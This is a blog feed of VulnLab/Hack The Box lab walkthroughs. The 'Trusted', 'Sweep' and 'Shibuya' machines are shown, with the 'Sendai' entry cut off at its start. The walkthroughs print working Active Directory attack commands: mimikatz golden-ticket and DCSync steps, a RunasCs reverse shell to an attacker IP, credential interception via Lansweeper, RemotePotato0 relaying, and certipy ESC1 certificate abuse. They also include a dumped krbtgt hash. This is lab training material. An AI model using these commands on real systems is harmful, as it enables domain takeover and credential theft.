class="line">privilege::debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::trust /patch</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/domain_trust.png" alt="Domain Trust"><br>Extracted the krbtgt hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:lab.trusted.vl /all</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/krbtgthash.png" alt="KRBTGT Hash"></p><p>Gathered the following information:</p><ol><li>LAB.TRUSTED.VL SID: S-1-5-21-2241985869-2159962460-1278545866</li><li>TRUSTED.VL SID: S-1-5-21-3576695518-347000760-3731839591 + 519</li><li>krbtgt hash: c7a03c565c68c6fac5f8913fab576ebd</li></ol><p>Created a golden ticket to exploit the trust relationship:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /rc4:c7a03c565c68c6fac5f8913fab576ebd /service:krbtgt /target:trusted.vl /ticket:trustkey.kirbi ptt</span><br></pre></td></tr></table></figure><p>Performed a DCSync attack to extract all domain credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all</span><br></pre></td></tr></table></figure><p><img src="/images/Trusted/trusted_admin.png" alt="Trusted Admin"></p><h2 id="Final-Privilege-Escalation"><a href="#Final-Privilege-Escalation" class="headerlink" title="Final Privilege Escalation"></a>Final Privilege Escalation</h2><p>Since we couldn’t directly access the <code>root.txt</code> file without administrator context, we changed the Administrator password and used RunasCs to get a shell with administrative privileges:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Administrator HelloWorld123@</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe Administrator &#x27;HelloWorld123@&#x27; cmd.exe -r &#x27;10.8.5.195:443&#x27;</span><br></pre></td></tr></table></figure><p>This provided us with full administrative access to the domain, completing the penetration test.<br><a href="https://api.vulnlab.com/api/v1/share?id=009839ab-3a10-4656-8b08-522ca143c36b">Vulnlab Cert</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Sweep</title>
      <link href="/2025/04/11/VL-Sweep/"/>
      <url>/2025/04/11/VL-Sweep/</url>
      
        <content type="html"><![CDATA[<h1 id="Sweep-Exploiting-Lansweeper-for-Full-Domain-Compromise"><a href="#Sweep-Exploiting-Lansweeper-for-Full-Domain-Compromise" class="headerlink" title="Sweep: Exploiting Lansweeper for Full Domain Compromise"></a>Sweep: Exploiting Lansweeper for Full Domain Compromise</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Sweep” machine, we demonstrate how misconfigured IT asset management tools can lead to complete domain compromise. Beginning with a null session authentication vulnerability that provides initial access, we progressively escalate privileges by intercepting scanning credentials from Lansweeper - a popular network inventory solution. The challenge showcases advanced Active Directory exploitation techniques including credential harvesting, group membership manipulation, and leveraging software deployment features to gain administrator access. This step-by-step guide highlights the security risks associated with misconfigured enterprise network management tools and demonstrates practical techniques for lateral movement in Windows domain environments.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>First, I conducted a port scan to identify open services on the target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE           REASON          VERSION</span><br><span class="line">53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">81/tcp    open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">82/tcp    open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?     syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?         syn-ack ttl 127</span><br><span class="line">636/tcp   open  ldapssl?          syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: SWEEP</span><br><span class="line">|   NetBIOS_Domain_Name: SWEEP</span><br><span class="line">|   NetBIOS_Computer_Name: INVENTORY</span><br><span class="line">|   DNS_Domain_Name: sweep.vl</span><br><span class="line">|   DNS_Computer_Name: inventory.sweep.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-10T22:49:54+00:00</span><br><span class="line">5357/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49675/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49682/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49718/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><p>I discovered that Lansweeper was running on port 81:<br><img src="/images/Sweep/lansweeper.png" alt="Lansweeper login page"></p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>During enumeration, I discovered that the target was vulnerable to null session authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.124.231 -u &#x27;panos&#x27; -p &#x27;&#x27; --shares --users</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/guest_account.png" alt="Guest account discovered"><br>I used <code>lookupsid</code> to enumerate valid usernames from the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid sweeper.vl/panos:&#x27;&#x27;@sweeper.vl -target 10.10.124.231 -no-pass </span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/sidlookup.png" alt="SID lookup results"><br>The ‘intern’ account looked suspicious. I tried using the credentials ‘intern:intern’ on the Lansweeper login page and gained access:<br><img src="/images/Sweep/intern.png" alt="Successful intern login"></p><h2 id="Privilege-Escalation-User"><a href="#Privilege-Escalation-User" class="headerlink" title="Privilege Escalation - User"></a>Privilege Escalation - User</h2><p>With access to the ‘intern’ account, I enumerated SMB shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.124.231 -u &#x27;intern&#x27; -p &#x27;intern&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/smb_intern.png" alt="SMB shares available to intern"><br>I examined the Lansweeper share but didn’t find anything immediately useful:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.124.231/Lansweeper$ -U intern</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/lansweeper_share.png" alt="Lansweeper share contents"><br>Next, I used BloodHound to map the Active Directory environment:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.124.231 -u &#x27;intern&#x27; -p &#x27;intern&#x27; --bloodhound --dns-server 10.10.124.231 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/bloodhound_enum.png" alt="BloodHound enumeration"><br>Two accounts stood out as particularly interesting: <code>svc_inventory_lnx</code> and <code>jgre808</code>.</p><h2 id="Exploiting-Lansweeper"><a href="#Exploiting-Lansweeper" class="headerlink" title="Exploiting Lansweeper"></a>Exploiting Lansweeper</h2><p>After logging in with intern:intern credentials, I explored the Lansweeper dashboard. I noticed that the account for Linux scanning had valid credentials, so I created a plan to intercept these credentials.<br>First, I created a scanning target pointing to my attack machine:<br><img src="/images/Sweep/scan_our.png" alt="Creating a scan target"><br>Then I set up a new mapping credential that would cause the Linux scan service account to connect to my machine:<br><img src="/images/Sweep/addit.png" alt="Adding credential mapping"><br>I also ensured my machine was marked as a Linux asset in the system:<br><img src="/images/Sweep/machine_linux.png" alt="Setting machine type to Linux"><br>Using <a href="https://github.com/fffaraz/fakessh">fakessh</a> tool, I captured the username and password of the scanning service account when it attempted to connect to my machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakessh ./</span><br></pre></td></tr></table></figure><p><img src="/images/Sweep/creds_svc.png" alt="Captured service account credentials"></p><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Now with the <code>svc_inventory_lnx</code> credentials, I discovered this account had “GenericAll” privileges over the “LANSWEEPER ADMINS” group. I added the service account to this privileged group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host sweep.vl -u &#x27;svc_inventory_lnx&#x27; -p &#x27;&lt;PASS&gt;&#x27; -d &#x27;sweep.vl&#x27; add groupMember &#x27;LANSWEEPER ADMINS&#x27; svc_inventory_lnx</span><br></pre></td></tr></table></figure><p>With elevated privileges, I connected to the target using WinRM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i sweep.vl -u svc_inventory_lnx -p &#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p>I was then able to access the user flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; type user.txt</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Administrator"><a href="#Privilege-Escalation-Administrator" class="headerlink" title="Privilege Escalation - Administrator"></a>Privilege Escalation - Administrator</h2><p>For the final privilege escalation, I logged into the Lansweeper application with the <code>svc_inventory_lnx</code> account, which now had administrative access.<br>I created another mapping credential targeting a Windows machine:<br><img src="/images/Sweep/new_map_cred.png" alt="New mapping credential for Windows"><br>Under the Deployment section, I created a new package that would allow me to execute commands on the target machine:<br><img src="/images/Sweep/hacked2.png" alt="Creating deployment package"><br>For the payload, I used a PowerShell reverse shell from <a href="https://www.revshells.com/">revshells.com</a> (PowerShell #2 option):<br><img src="/images/Sweep/deployment.png" alt="Setting up deployment payload"><br>After clicking “Deploy Now” and selecting the appropriate asset:<br><img src="/images/Sweep/asset_select.png" alt="Asset selection"><br>I received a reverse shell with administrator privileges, completing the compromise:<br><img src="/images/Sweep/root.png" alt="Root access achieved"></p><p>Share URL:<br><a href="https://api.vulnlab.com/api/v1/share?id=09c407ea-4484-4143-9d7b-866afabd26b4">https://api.vulnlab.com/api/v1/share?id=09c407ea-4484-4143-9d7b-866afabd26b4</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Shibuya</title>
      <link href="/2025/04/10/VL-Shibuya/"/>
      <url>/2025/04/10/VL-Shibuya/</url>
      
        <content type="html"><![CDATA[<h1 id="VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough"><a href="#VL-Shibuya-Active-Directory-Penetration-Testing-Walkthrough" class="headerlink" title="VL-Shibuya: Active Directory Penetration Testing Walkthrough"></a>VL-Shibuya: Active Directory Penetration Testing Walkthrough</h1><p>This comprehensive Vulnlab - Hack The Box walkthrough details my step-by-step approach to compromising the Shibuya Active Directory environment. Starting with initial enumeration and discovery of a pre-created machine account, I leveraged various offensive security techniques including Kerberos authentication, password spraying, and registry hive extraction to gain a foothold. The attack path progressed through cross-session relay attacks and ultimately achieved domain admin privileges via vulnerable certificate templates (ESC1). This penetration testing guide demonstrates practical exploitation of common Active Directory security misconfigurations found in enterprise environments, providing valuable insights for both offensive security professionals and defenders.</p><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>First, I checked for null sessions, but access was denied:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;hello&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/no_null.png" alt="SMB Null Session Attempt"></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>I used Kerbrute to identify valid users in the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum --dc 10.10.82.222 -d shibuya.vl /usr/share/wordlists/seclists/Usernames/Names/names.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/valid_user.png" alt="Valid User Discovery"></p><h2 id="Exploiting-Pre-created-Machine-Account"><a href="#Exploiting-Pre-created-Machine-Account" class="headerlink" title="Exploiting Pre-created Machine Account"></a>Exploiting Pre-created Machine Account</h2><p>I discovered a machine account named <code>RED$</code> which was pre-created. According to Microsoft documentation, these accounts can have their passwords changed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/precreated_m.png" alt="Pre-created Machine Account"><br>We can authenticate using Kerberos:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;red&#x27; --shares --kerberos</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/kerberos_auth.png" alt="Kerberos Authentication"><br>I changed the password for easier access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;shibuya.vl/RED$&#x27;:red@shibuya.vl -newpass &#x27;HelloWorld123@&#x27; -dc-ip AWSJPDC0522.shibuya.vl -p rpc-samr</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/pass_change.png" alt="Password Change"></p><h2 id="Share-Access-and-Enumeration"><a href="#Share-Access-and-Enumeration" class="headerlink" title="Share Access and Enumeration"></a>Share Access and Enumeration</h2><p>With our new credentials, I connected to the shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/users -U &#x27;RED$&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/smb_access.png" alt="SMB Access"><br>Found users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">All Users</span><br><span class="line">Default</span><br><span class="line">Default User</span><br><span class="line">nigel.mills</span><br><span class="line">simon.watson</span><br></pre></td></tr></table></figure><h2 id="Service-Account-Discovery"><a href="#Service-Account-Discovery" class="headerlink" title="Service Account Discovery"></a>Service Account Discovery</h2><p>I enumerated users and found an interesting service account with credentials in the description:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;RED$&#x27; -p &#x27;HelloWorld123@&#x27; --users</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/svc_account.png" alt="Service Account"><br>Found credentials: <code>svc_autojoin : &lt;HELLNO&gt;</code><br>Using these credentials allowed access to more shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;svc_autojoin&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/more_shares.png" alt="More Shares"></p><h2 id="Registry-Hive-Extraction"><a href="#Registry-Hive-Extraction" class="headerlink" title="Registry Hive Extraction"></a>Registry Hive Extraction</h2><p>I connected to an images share with potentially useful data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/images_share.png" alt="Images Share"><br>I extracted a Windows Image (WIM) file containing registry hives:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.82.222/images$ -U &#x27;svc_autojoin&#x27; -c &#x27;timeout 120; iosize 16384; get \AWSJPWK0222-02.wim&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wimmountrw AWSJPWK0222-02.wim 1 /mnt/wim_mount</span><br></pre></td></tr></table></figure><p>After mounting, I extracted the SAM, SYSTEM, and SECURITY hives and ran secretsdump:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/hives.png" alt="Registry Hives"><br>From the output, I found interesting hashes, including an operator hash and a cached domain logon:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56)</span><br></pre></td></tr></table></figure><h2 id="Gaining-User-Access"><a href="#Gaining-User-Access" class="headerlink" title="Gaining User Access"></a>Gaining User Access</h2><p>The hash for Simon didn’t work directly, but password spraying with the operator hash worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/simon.watson.png" alt="Simon Watson Access"><br>While WinRM didn’t work, I remembered port 22 (SSH) was open. I uploaded an SSH key via SMB to gain shell access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb shibuya.vl -u &#x27;Simon.Watson&#x27; -H &lt;HASH&gt; --shares</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f simon</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;mkdir simon.watson/.ssh; put /home/kali/.ssh/simon.w.pub simon.watson/.ssh/authorized_keys&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/simon Simon.Watson@10.10.94.60</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/ssh_access.png" alt="SSH Access"></p><h2 id="Active-Directory-Reconnaissance"><a href="#Active-Directory-Reconnaissance" class="headerlink" title="Active Directory Reconnaissance"></a>Active Directory Reconnaissance</h2><p>I uploaded SharpHound to collect AD data:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpHound.exe -c All</span><br></pre></td></tr></table></figure><p>Downloaded the results for analysis:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash &lt;HASH&gt; -c &#x27;get &quot;simon.watson/20250410065413_BloodHound.zip&quot; Shibuya_BloodHound.zip&#x27;</span><br></pre></td></tr></table></figure><h2 id="Cross-Session-Relay-Attack"><a href="#Cross-Session-Relay-Attack" class="headerlink" title="Cross-Session Relay Attack"></a>Cross-Session Relay Attack</h2><p>BloodHound analysis revealed two users with active sessions: Simon.Watson (which we already owned) and Nigel.Mills. I decided to perform a cross-session relay attack to compromise Nigel.Mills’s account.<br><img src="/images/Shibuya/crossseionattack.png" alt="Cross Session Attack"><br>First, I uploaded RemotePotato0 (which evades antivirus detection):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.78.105/users -U shibuya.vl/Simon.Watson --pw-nt-hash 5d8c3d1a20bd63f60f469f6763ca0d50 -c &#x27;put /home/panosoiko/Downloads/RemotePotato0.exe simon.watson/RemotePotato0.exe&#x27;</span><br></pre></td></tr></table></figure><p>On the victim machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RemotePotato0.exe -m 2 -s 1 -x 10.8.5.195 -p 8080</span><br></pre></td></tr></table></figure><p>On the attacker machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.78.105:8080</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/nigel.mills.png" alt="Nigel Mills Access"><br>I cracked the captured hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash322.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: <code>nigel.mills : Sail2.......</code></p><h2 id="Privilege-Escalation-via-Certificate-Templates"><a href="#Privilege-Escalation-via-Certificate-Templates" class="headerlink" title="Privilege Escalation via Certificate Templates"></a>Privilege Escalation via Certificate Templates</h2><p>BloodHound revealed that Nigel could RDP to the machine and had certificate enrollment permissions:<br><img src="/images/Shibuya/rdp_access.png" alt="RDP Access"><br><img src="/images/Shibuya/cert_enroll.png" alt="Certificate Enrollment"><br>I set up an SSH tunnel to access LDAP services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R 1080 -N sshuser@10.8.5.195</span><br></pre></td></tr></table></figure><p>Used Certipy to analyze the certificate templates:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy find -target 10.10.78.105 -dc-ip 10.10.78.105 -u &#x27;nigel.mills@shibuya.vl&#x27; -p &#x27;&#x27; -debug</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/certipy.png" alt="Certipy Results"><br>Found vulnerabilities in ESC1, ESC2, and ESC3. Decided to exploit ESC1 as it’s the easiest:<br><img src="/images/Shibuya/esc1.png" alt="ESC1 Vulnerability"><br>First attempt at exploiting the certificate template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -dc-ip 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -ca shibuya-AWSJPDC0522-CA -u nigel.mills@shibuya.vl -p &#x27;&#x27; -upn administrator@shibuya.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/adminkey.png" alt="Admin Key"><br><img src="/images/Shibuya/noadmin.png" alt="No Admin Access"><br>This didn’t work. Looking closer at the template, I noticed that <code>_admin</code> was the owner:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object Control Permissions</span><br><span class="line">   Owner: SHIBUYA.VL\_admin</span><br></pre></td></tr></table></figure><p>Due to certificate-based authentication changes (KB5014754), I needed to include the SID when requesting a certificate:<br><a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16?preview=true</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy req -u nigel.mills@shibuya.vl -p PASS -ca shibuya-AWSJPDC0522-CA -target 10.10.78.105 -target-ip 10.10.78.105 -template ShibuyaWeb -upn &#x27;_admin@shibuya.vl&#x27; -key-size 4096 -sid &#x27;S-1-5-21-87560095-894484815-3652015022-500&#x27; -debug</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q certipy auth -pfx _admin.pfx -dc-ip 10.10.78.105</span><br></pre></td></tr></table></figure><p><img src="/images/Shibuya/booom.png" alt="Domain Admin Access"><br>Finally, I used Evil-WinRM to access the domain controller as <code>_admin</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q evil-winrm -i 10.10.78.105 -u &#x27;_admin&#x27; -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p>Success! Domain admin access achieved.</p><p><a href="https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0">https://api.vulnlab.com/api/v1/share?id=1e23a5da-28c7-4613-b7ed-b106bc9b90b0</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Sendai</title>
      <link href="/2025/04/08/VL-Sendai/"/>
      <url>/2025/04/08/VL-Sendai/</url>
      
        <content type="html"><![CDATA[<h1 id="VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough"><a href="#VL-Sendai-Active-Directory-Certificate-Services-Penetration-Testing-Walkthrough" class="headerlink" title="VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough"></a>VL-Sendai: Active Directory Certificate Services Penetration Testing Walkthrough</h1><p>This comprehensive Vulnlab - Hack The Box walkthrough documents my methodical approach to compromising the Sendai Active Directory environment. Beginning with initial reconnaissance and SMB enumeration, I discovered an opportunity to reset expired passwords, providing the initial foothold. Through systematic privilege escalation leveraging gMSA password extraction, service account credential exposure, and ultimately Active Directory Certificate Services (ADCS) exploitation via ESC4 vulnerability, I achieved domain administrator access. This penetration testing guide demonstrates practical techniques for exploiting common misconfigurations in enterprise environments, including password policy weaknesses, excessive group permissions, and vulnerable certificate templates. As an alternative attack path, I’ve also included MSSQL server exploitation techniques, showing the versatility of approaches available to security professionals when assessing Active Directory infrastructures.</p><h2 id="Initial-Reconnaissance"><a 